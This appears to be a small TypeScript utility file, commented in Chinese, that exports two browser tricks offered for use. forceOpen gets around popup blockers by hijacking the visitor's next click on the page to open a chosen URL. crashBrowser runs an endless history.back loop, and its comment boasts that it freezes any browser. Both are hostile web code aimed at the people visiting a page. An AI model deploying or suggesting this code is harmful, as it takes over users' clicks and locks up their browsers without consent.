/**
 * @fileOverview 让浏览器强制打开指定网页。
 * @author xuld@vip.qq.com
 */

/**
 * 强制打开指定网页。
 * @param url 要打开的地址。
 * @example forceOpen("http://tealui.com/")
 */
export function forceOpen(url: string) {
    if (!window.open(url)) {
        var oldOnClick = document.onclick;
        document.onclick = function () {
            document.onclick = oldOnClick;
            window.open(url);
            return oldOnClick && oldOnClick.apply(document, arguments);
        };
    }
}

/**
 * 让浏览器卡死，支持所有浏览器，信不信由你，反正我信了。
 * @example crashBrowser()
 */
export function crashBrowser() {
    while (1) history.back(-1);
}
